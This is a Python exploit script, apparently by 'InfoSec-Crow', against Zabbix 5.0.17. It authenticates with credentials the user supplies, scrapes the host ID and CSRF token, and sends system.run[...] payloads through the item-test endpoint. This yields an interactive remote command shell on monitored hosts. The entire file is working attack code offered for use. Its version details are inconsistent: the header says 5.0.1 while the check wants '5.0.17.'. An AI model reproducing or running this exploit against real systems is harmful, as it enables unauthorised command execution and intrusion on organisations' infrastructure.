#!/usr/bin/python3
# Autor: InfoSec-Crow
# Date: 06.04.2022
# Info: Works on Zabbix 5.0.1

import sys
import requests
import json
import re 

import random
import string

global url, username, password, hostId, sid

def _log(msg, fail=False):
    nb = '[*]'
    if fail:
        nb = '[-]'
    print(f"{nb} {msg}")

def login(s):
    data = {  
    "request":"hosts.php", 
    "name"  : username ,
    "password" : password ,
    "autologin" :"1" ,
    "enter":"Sign+in"
    }
    # Check Login
    r = s.post(url+"/index.php",data=data)
    if "Sign out" not in r.text:
        _log("Authentication failed", fail=True)
        sys.exit(-1)
    # Check Version
    version = re.search('Zabbix ([0-9.]+)', r.text).group(1).strip()
    if version != "5.0.17.":
        _log(f"This is not Zabbix 5.0.17, its {version}", fail=True)
        sys.exit(-1)
    # Check HostID
    if "filter_hostids%5B0%5D=" in r.text:
        try:
            x = re.search('filter_hostids%5B0%5D=(.*?)"', r.text)
            hostId = x.group(1)
            sid = re.search('<meta name="csrf-token" content="(.*)"/>',r.text).group(1)
            _log(f"Get hostId: {hostId}")
            _log(f"Get sid: {sid}")
            return hostId, sid
        except:
            pass
    _log("Exploit failed to resolve HostID", fail=True)
    sys.exit(-1)

def edit_item(s):
    params_edit = {
        'sid': sid,
        'action': 'popup.itemtest.edit',
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    data_edit = f'key=test&delay=1m&value_type=3&item_type=0&itemid=0&valuemapid=0&interfaceid=1&hostid={hostId}&test_type=0&step_obj=-2&show_final_result=1&get_value=1'
    res_edit = s.post(url + '/zabbix.php', headers=headers, params=params_edit, data=data_edit, verify=False)
    if res_edit.status_code == 200:
        _log("Edit item successfully")
    else:
        _log(f"Edit Item failed, Status Code: {res_edit.status_code}", fail=True)
        sys.exit(-1)

def send_item(s, cmd):
    payload = f"system.run[{cmd}]"
    params_send = {
        'sid': sid,
        'action': 'popup.itemtest.send',
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    data_send = f'key={payload}&delay=&value_type=3&item_type=0&itemid=0&interfaceid=0&get_value=1&interface%5Baddress%5D=127.0.0.1&interface%5Bport%5D=10050&proxy_hostid=0&show_final_result=1&test_type=0&hostid={hostId}&valuemapid=0&value='
    res_send = s.post(url + '/zabbix.php', headers=headers, params=params_send, data=data_send, verify=False)
    if res_send.status_code == 200:
        json_obj = json.loads(res_send.text)
        print(json_obj["value"] + "\n")
    else:
        _log(f"Send Item failed, Status Code: {res_send.status_code}", fail=True)

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage: ./expoit.py <target url> <username> <password>")
        print("Example: ./exploit.py http://example.com Administrator Password123")
        sys.exit(-1)
    url = sys.argv[1]
    username =sys.argv[2]
    password = sys.argv[3]

    s = requests.Session()
    
    hostId, sid = login(s)
    edit_item(s)

    while True:
        cmd = input("cmd> ")
        if cmd.strip() == "exit":
            print("Bye")
            sys.exit()
        send_item(s, cmd)